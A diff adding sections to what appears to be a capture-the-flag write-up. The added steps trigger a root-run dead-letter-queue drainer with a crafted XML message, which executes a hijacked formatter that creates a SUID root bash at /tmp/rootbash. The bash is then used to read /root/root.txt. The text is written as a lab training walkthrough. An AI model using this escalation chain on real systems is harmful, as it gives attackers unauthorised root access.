@@ -1557,6 +1557,83 @@ os.chmod("/tmp/rootbash", 0o4755)
 ```
 
 Key finding: the root-executed formatter now contains the dropper. The next DLQ message processed by the root timer will create a SUID root bash at `/tmp/rootbash`.
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 5.5.2 Trigger the DLQ to fire the root timer
+
+Push a message that fails downstream validation so it lands on the DLQ, which the root drainer then processes, executing the hijacked formatter.
+
+A first attempt with an arbitrary malformed body is rejected at the ingest gate, which checks for the four required element names before accepting:
+
+**Command:** `curl -s -X POST http://127.0.0.1:8081/feeds/aidx -H 'Content-Type: application/xml' --data-binary '<WrongRoot><bad/></WrongRoot>'`
+
+**Result:**
+
+```shell
+{"accepted":false,"reason":"missing_parameters","missing":["IATA_AIDX_FlightLegNotifRQ","Originator","FlightLeg","LegIdentifier"]}
+```
+
+That never reaches Kafka. The DLQ is for messages that pass the shallow ingest check but fail deeper validation, so the payload must contain all four required element names while being structurally invalid. Wrapping the required tags in a bogus root does exactly that.
+
+**Command:**
+
+```bash
+curl -s -X POST http://127.0.0.1:8081/feeds/aidx -H 'Content-Type: application/xml' \
+  --data-binary '<WrongRoot><IATA_AIDX_FlightLegNotifRQ/><Originator/><FlightLeg><LegIdentifier/></FlightLeg></WrongRoot>'
+
+for i in $(seq 1 16); do sleep 10; if [ -e /tmp/rootbash ]; then ls -l /tmp/rootbash; break; fi; done
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `<WrongRoot>...required tags...</WrongRoot>` | Pass ingest, fail downstream | Contains the four required element names so ingest accepts it, but the wrong root makes the downstream parser reject it, routing it to the DLQ. |
+| `for ... sleep 10 ... /tmp/rootbash` | Poll for success | Waits for the next 2-minute root tick and checks whether the dropper has created the SUID bash. |
+
+**Result:**
+
+```shell
+{"accepted":true,"topic":"aidx.flightleg.raw.v1"}
+-rwsr-xr-x 1 root root 1446024 Oct 17 16:42 /tmp/rootbash
+```
+
+Key finding: the message is accepted, lands on the DLQ, and within one timer cycle the root-run drainer executes the hijacked formatter, leaving a root-owned SUID bash at `/tmp/rootbash`.
+
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+#### 5.5.3 Root shell and flag
+
+Run the SUID bash with `-p` to keep the effective root UID, and read the flag.
+
+**Command:** `/tmp/rootbash -p -c 'id; cat /root/root.txt'`
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `/tmp/rootbash -p` | Keep privileges | Runs the SUID bash without dropping the root effective UID. |
+| `-c 'id; cat /root/root.txt'` | Prove and loot | Confirms `euid=0` and reads the root flag. |
+
+**Result:**
+
+```shell
+uid=1001(martin_cole) gid=1001(martin_cole) euid=0(root) groups=1001(martin_cole),100(users)
+09230430a6d6a9494ce48b90866b2996
+```
+
+**ROOT FLAG:** `09230430a6d6a9494ce48b90866b2996`
+
 
 
 
